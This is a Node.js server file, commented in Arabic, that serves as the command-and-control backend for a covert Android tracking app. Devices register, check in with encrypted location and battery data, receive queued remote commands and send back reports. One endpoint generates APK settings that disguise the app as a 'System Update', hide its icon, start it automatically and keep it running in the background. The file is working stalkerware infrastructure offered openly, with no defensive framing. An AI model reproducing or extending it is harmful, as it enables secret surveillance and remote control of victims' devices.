// server/index.js
const express = require('express');
const cors = require('cors');
const crypto = require('crypto');

const app = express();
app.use(cors({ origin: '*' }));
app.use(express.json());

// قاعدة بيانات الأجهزة (في الإنتاج استخدم MongoDB/PostgreSQL)
const clientsDB = new Map();
const commandsQueue = new Map();

// توليد مفتاح تشفير
function generateEncryptionKey() {
    return crypto.randomBytes(32).toString('hex');
}

// تشفير البيانات (Base64 + AES مبسط)
function encryptData(data, key) {
    try {
        const algorithm = 'aes-256-cbc';
        const keyBuffer = Buffer.from(key, 'hex');
        const iv = crypto.randomBytes(16);
        const cipher = crypto.createCipheriv(algorithm, keyBuffer, iv);
        let encrypted = cipher.update(JSON.stringify(data), 'utf8', 'base64');
        encrypted += cipher.final('base64');
        return iv.toString('hex') + ':' + encrypted;
    } catch (error) {
        return Buffer.from(JSON.stringify(data)).toString('base64');
    }
}

// فك التشفير
function decryptData(encryptedData, key) {
    try {
        const algorithm = 'aes-256-cbc';
        const keyBuffer = Buffer.from(key, 'hex');
        const parts = encryptedData.split(':');
        if (parts.length < 2) throw new Error('Invalid format');
        const iv = Buffer.from(parts[0], 'hex');
        const encrypted = parts.length === 3 ? parts[2] : parts[1];
        const decipher = crypto.createDecipheriv(algorithm, keyBuffer, iv);
        let decrypted = decipher.update(encrypted, 'base64', 'utf8');
        decrypted += decipher.final('utf8');
        return JSON.parse(decrypted);
    } catch (error) {
        try {
            return JSON.parse(Buffer.from(encryptedData, 'base64').toString('utf8'));
        } catch (e) {            return { commands: [] };
        }
    }
}

// =========================================
// 🔹 API Endpoints
// =========================================

// الصفحة الرئيسية
app.get('/', (req, res) => {
    res.json({ 
        success: true, 
        message: '🖥️ Device Tracker Server v2.0', 
        timestamp: new Date().toISOString(),
        endpoints: {
            register: 'POST /api/clients/register',
            checkin: 'POST /api/clients/checkin',
            report: 'POST /api/clients/report',
            devices: 'GET /api/devices',
            command: 'POST /api/devices/:id/command',
            generateConfig: 'POST /api/config/generate'
        }
    });
});

// 📝 تسجيل جهاز جديد
app.post('/api/clients/register', (req, res) => {
    try {
        const { clientId, deviceInfo, config } = req.body;
        
        if (!clientId) {
            return res.status(400).json({ success: false, error: 'clientId is required' });
        }
        
        const deviceId = 'device_' + crypto.randomUUID();
        const encryptionKey = generateEncryptionKey();
        
        const client = {
            deviceId,
            clientId,
            encryptionKey,
            deviceInfo: deviceInfo || {},
            config: config || {},
            registeredAt: new Date().toISOString(),
            status: 'active',
            lastCheckIn: null,
            lastReport: null
        };
                clientsDB.set(deviceId, client);
        commandsQueue.set(deviceId, []);
        
        console.log(`✅ New device registered: ${deviceId}`);
        
        res.json({ 
            success: true, 
            deviceId, 
            encryptionKey,
            message: 'Device registered successfully',
            config: client.config
        });
    } catch (error) {
        console.error('❌ Registration error:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// 🔄 Check-in من الجهاز
app.post('/api/clients/checkin', (req, res) => {
    try {
        const { deviceId, encryptedData } = req.body;
        
        if (!deviceId) {
            return res.status(400).json({ success: false, error: 'deviceId is required' });
        }
        
        const client = clientsDB.get(deviceId);
        
        if (!client) {
            return res.status(404).json({ success: false, error: 'Device not found' });
        }
        
        // تحديث الحالة
        client.lastCheckIn = new Date().toISOString();
        client.status = 'active';
        clientsDB.set(deviceId, client);
        
        // فك تشفير البيانات الواردة (للتسجيل)
        if (encryptedData) {
            try {
                const decrypted = decryptData(encryptedData, client.encryptionKey);
                console.log(`📡 Check-in from ${deviceId}:`, {
                    status: decrypted.status,
                    battery: decrypted.battery?.level,
                    location: decrypted.location?.latitude ? 'present' : 'none'
                });
            } catch (e) {}
        }
                // تجهيز الأوامر المعلقة
        const pendingCommands = commandsQueue.get(deviceId) || [];
        if (pendingCommands.length > 0) {
            commandsQueue.set(deviceId, []);
            console.log(`📤 Sending ${pendingCommands.length} command(s) to ${deviceId}`);
        }
        
        // تشفير الرد
        const responseData = { commands: pendingCommands };
        const encryptedResponse = encryptData(responseData, client.encryptionKey);
        
        res.json({ 
            success: true, 
            encryptedData: encryptedResponse,
            timestamp: new Date().toISOString()
        });
    } catch (error) {
        console.error('❌ Check-in error:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// 📊 استقبال تقرير من الجهاز
app.post('/api/clients/report', (req, res) => {
    try {
        const { deviceId, commandId, result, status, data } = req.body;
        
        console.log(`📊 Report from ${deviceId || 'unknown'}:`, {
            commandId: commandId ? commandId.substring(0, 15) + '...' : 'none',
            status,
            hasResult: !!result,
            hasData: !!data
        });
        
        if (deviceId && clientsDB.has(deviceId)) {
            const client = clientsDB.get(deviceId);
            client.lastReport = new Date().toISOString();
            if (data) client.lastData = data;
            clientsDB.set(deviceId, client);
        }
        
        res.json({ 
            success: true, 
            message: 'Report received',
            timestamp: new Date().toISOString()
        });
    } catch (error) {
        console.error('❌ Report error:', error);
        res.status(500).json({ success: false, error: error.message });
    }});

// 📱 جلب جميع الأجهزة
app.get('/api/devices', (req, res) => {
    try {
        const devices = Array.from(clientsDB.values()).map(client => ({
            deviceId: client.deviceId,
            clientId: client.clientId,
            deviceInfo: client.deviceInfo,
            config: client.config,
            status: client.status,
            registeredAt: client.registeredAt,
            lastCheckIn: client.lastCheckIn,
            lastReport: client.lastReport,
            isOnline: client.lastCheckIn && 
                (Date.now() - new Date(client.lastCheckIn).getTime()) < 60000
        }));
        
        res.json({ 
            success: true, 
            count: devices.length, 
            devices,
            timestamp: new Date().toISOString()
        });
    } catch (error) {
        console.error('❌ Get devices error:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// 📤 إرسال أمر لجهاز معين
app.post('/api/devices/:deviceId/command', (req, res) => {
    try {
        const { deviceId } = req.params;
        const { type, action, payload, priority = 'normal' } = req.body;
        
        if (!type && !action) {
            return res.status(400).json({ success: false, error: 'Command type or action is required' });
        }
        
        const client = clientsDB.get(deviceId);
        
        if (!client) {
            return res.status(404).json({ success: false, error: 'Device not found' });
        }
        
        const command = {
            id: 'cmd_' + crypto.randomUUID(),
            type: type || 'custom',
            action: action || null,            payload: payload || {},
            priority,
            createdAt: new Date().toISOString(),
            status: 'pending'
        };
        
        // إضافة للأوامر المعلقة
        if (!commandsQueue.has(deviceId)) {
            commandsQueue.set(deviceId, []);
        }
        commandsQueue.get(deviceId).push(command);
        
        console.log(`📤 Command queued for ${deviceId}: ${command.type} (priority: ${priority})`);
        
        res.json({ 
            success: true, 
            command,
            message: 'Command queued successfully',
            queueLength: commandsQueue.get(deviceId).length
        });
    } catch (error) {
        console.error('❌ Command error:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// =========================================
// 🔹 ميزة Config Injection (الجديدة!)
// =========================================

// 🎯 توليد إعدادات APK مخصصة
app.post('/api/config/generate', (req, res) => {
    try {
        const { 
            serverUrl, 
            clientId, 
            appName = 'System Update',
            appId = 'com.system.service',
            hideIcon = true,
            autoStart = true,
            checkInInterval = 30000,
            customConfig = {}
        } = req.body;
        
        if (!serverUrl) {
            return res.status(400).json({ success: false, error: 'serverUrl is required' });
        }
        
        // توليد معرف فريد لهذه الإعدادات
        const configId = 'cfg_' + crypto.randomUUID();        
        // إنشاء كائن الإعدادات
        const apkConfig = {
            configId,
            generatedAt: new Date().toISOString(),
            app: {
                name: appName,
                id: appId,
                version: '2.0.0'
            },
            server: {
                url: serverUrl,
                checkInInterval,
                timeout: 10000,
                retries: 5
            },
            behavior: {
                hideIcon,
                autoStart,
                runInBackground: true,
                preventSleep: true
            },
            security: {
                encryptData: true,
                verifySSL: true
            },
            custom: customConfig
        };
        
        // حفظ الإعدادات (اختياري - للتتبع)
        // configsDB.set(configId, apkConfig);
        
        console.log(`⚙️ Config generated: ${configId} for server: ${serverUrl}`);
        
        res.json({
            success: true,
            configId,
            config: apkConfig,
            // كود HTML جاهز للنسخ في index.html
            htmlSnippet: `<script id="app-config" type="application/json">
${JSON.stringify(apkConfig)}
</script>`,
            // رابط التحميل لو عندك نظام تخزين
            // downloadUrl: `https://your-storage.com/apks/${configId}.apk`
        });
        
    } catch (error) {
        console.error('❌ Config generation error:', error);
        res.status(500).json({ success: false, error: error.message });
    }});

// 📥 جلب إعدادات حسب configId
app.get('/api/config/:configId', (req, res) => {
    try {
        const { configId } = req.params;
        
        // في الإنتاج: جلب من قاعدة البيانات
        // هنا: نرجع رسالة أن الإعدادات ديناميكية
        res.json({
            success: true,
            message: 'Configs are generated dynamically via POST /api/config/generate',
            note: 'Include the generated HTML snippet in hidden-apk/index.html before building APK'
        });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// =========================================
// 🚀 تشغيل الخادم
// =========================================

const PORT = parseInt(process.env.PORT || '3000', 10);
const HOST = '0.0.0.0';

app.listen(PORT, HOST, () => {
    console.log('╔════════════════════════════════════════╗');
    console.log('║   🖥️  DEVICE TRACKER SERVER v2.0       ║');
    console.log('╠════════════════════════════════════════╣');
    console.log(`║   🌐 Running on port ${PORT}`);
    console.log(`║   🔗 Local: http://localhost:${PORT}`);
    console.log('║   ✨ Features:                          ║');
    console.log('║   • Device registration & tracking      ║');
    console.log('║   • Encrypted communication             ║');
    console.log('║   • Remote command execution            ║');
    console.log('║   • 🎯 Dynamic Config Injection         ║');
    console.log('║   ✅ Server is ready!                   ║');
    console.log('╚════════════════════════════════════════╝');
});

// معالجة الأخطاء
process.on('unhandledRejection', (error) => {
    console.error('❌ Unhandled Promise Rejection:', error);
});

process.on('uncaughtException', (error) => {
    console.error('❌ Uncaught Exception:', error);
});
module.exports = app;